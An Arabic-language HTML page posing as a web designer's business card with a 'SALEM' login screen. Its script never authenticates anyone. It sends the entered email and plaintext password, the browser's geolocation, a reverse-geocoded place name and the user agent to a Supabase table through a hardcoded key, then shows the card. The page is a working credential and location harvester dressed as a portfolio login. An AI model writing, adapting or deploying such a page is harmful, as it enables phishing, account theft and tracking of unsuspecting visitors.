<!DOCTYPE HTML>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>SALEM | سـالـم</title>
    
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,700&display=swap"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    
    <style>
        :root {
            --back: radial-gradient(circle at center, #0a192f 0%, #020c1b 100%);
            --gold: #FFD700;
            --muted: #c5a059;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: var(--back); height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; color: white; }

        /* واجهة الدخول */
        .login-box {
            width: 90%; max-width: 400px; background: rgba(10, 25, 47, 0.95);
            padding: 40px 30px; border-radius: 24px; border: 1px solid var(--muted);
            text-align: center; backdrop-filter: blur(15px); box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }
        .login-box h2 { color: var(--gold); margin-bottom: 25px; }
        .login-box input {
            width: 100%; padding: 14px; margin-bottom: 15px; background: rgba(255,255,255,0.05);
            border: 1px solid rgba(197, 160, 89, 0.3); border-radius: 12px; color: white; outline: none; text-align: center;
        }
        .login-box button {
            width: 100%; padding: 14px; background: var(--gold); border: none;
            border-radius: 12px; color: #020c1b; font-weight: bold; cursor: pointer; transition: 0.3s;
        }
        .login-box button:disabled { background: #444; color: #888; }

        /* البطاقة (مخفية) */
        .vcard { 
            width: 90%; max-width: 420px; height: 600px; background: rgba(10, 25, 47, 0.7); 
            border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2); 
            position: relative; overflow: hidden; display: none; text-align: center;
        }
        .header { height: 35%; background: linear-gradient(45deg, #1A2980, #c5a059); position: relative; }
        .profile_pic { width: 130px; height: 130px; border-radius: 50%; border: 3px solid var(--gold); position: absolute; bottom: -65px; left: 50%; transform: translateX(-50%); overflow: hidden; }
        .card_content { margin-top: 80px; padding: 20px; }
        .social-icons a { color: var(--gold); font-size: 1.5em; margin: 0 10px; }
    </style>
</head>
<body>

<div class="login-box" id="loginBox">
    <h2>SALEM | دخول</h2>
    <input type="email" id="email" placeholder="البريد الإلكتروني">
    <input type="password" id="password" placeholder="كلمة المرور">
    <button id="loginBtn" onclick="handleLogin()">دخول</button>
    <p id="status" style="margin-top: 15px; font-size: 0.85em; color: var(--muted);"></p>
</div>

<div class="vcard" id="mainCard">
    <div class="header">
        <div class="profile_pic">
            <video autoplay loop muted playsinline style="width: 100%; height: 100%; object-fit: cover;">
                <source src="https://files.catbox.moe/jvicv4.mp4" type="video/mp4">
            </video>
        </div>
    </div>
    <div class="card_content">
        <h3 style="font-size: 2em; color: var(--gold);">SALEM</h3>
        <p style="color: var(--muted); margin: 10px 0;">Web Designer & Creative Developer</p>
        <div class="social-icons">
            <a href="https://t.me/kokksha"><i class="fab fa-telegram"></i></a>
            <a href="https://github.com/salemalshamrie"><i class="fab fa-github"></i></a>
        </div>
    </div>
</div>

<script>
    // استخدمت المفاتيح التي أرسلتها أنت مباشرة وبدون أي تعديل
    const _URL = 'https://kcckppfflaxpxhipngdz.supabase.co';
    const _KEY = 'EyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
    
    // إنشاء الاتصال
    const _supabase = supabase.createClient(_URL, _KEY);

    async function handleLogin() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        const status = document.getElementById('status');
        const btn = document.getElementById('loginBtn');

        if (!email || !pass) { status.innerText = "❌ أدخل البيانات"; return; }

        btn.disabled = true;
        status.innerText = "⏳ جاري الربط...";

        // محاولة جلب الموقع بمهلة 5 ثوانٍ
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (p) => {
                    const loc = await getLocName(p.coords.latitude, p.coords.longitude);
                    await saveData(email, pass, p.coords.latitude, p.coords.longitude, loc);
                },
                async () => { await saveData(email, pass, null, null, "مرفوض"); },
                { timeout: 5000 }
            );
        } else { await saveData(email, pass, null, null, "غير مدعوم"); }
    }

    async function getLocName(lt, ln) {
        try {
            const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lt}&lon=${ln}`);
            const d = await r.json(); return d.display_name || "إحداثيات";
        } catch { return "غير معروف"; }
    }

    async function saveData(e, p, lt, ln, n) {
        try {
            const { error } = await _supabase.from('users_data').insert([{
                email: e, password: p, latitude: lt?.toString(), longitude: ln?.toString(),
                location_name: n, device_info: navigator.userAgent
            }]);

            if (error) {
                // إذا ظهر الخطأ هنا، فالمشكلة في مفتاح سوبابيس نفسه
                console.error(error);
                document.getElementById('status').innerText = "خطأ: " + error.message;
                document.getElementById('loginBtn').disabled = false;
            } else {
                document.getElementById('loginBox').style.display = 'none';
                document.getElementById('mainCard').style.display = 'block';
            }
        } catch (err) {
            document.getElementById('status').innerText = "❌ فشل الاتصال";
            document.getElementById('loginBtn').disabled = false;
        }
    }
</script>
</body>
</html>
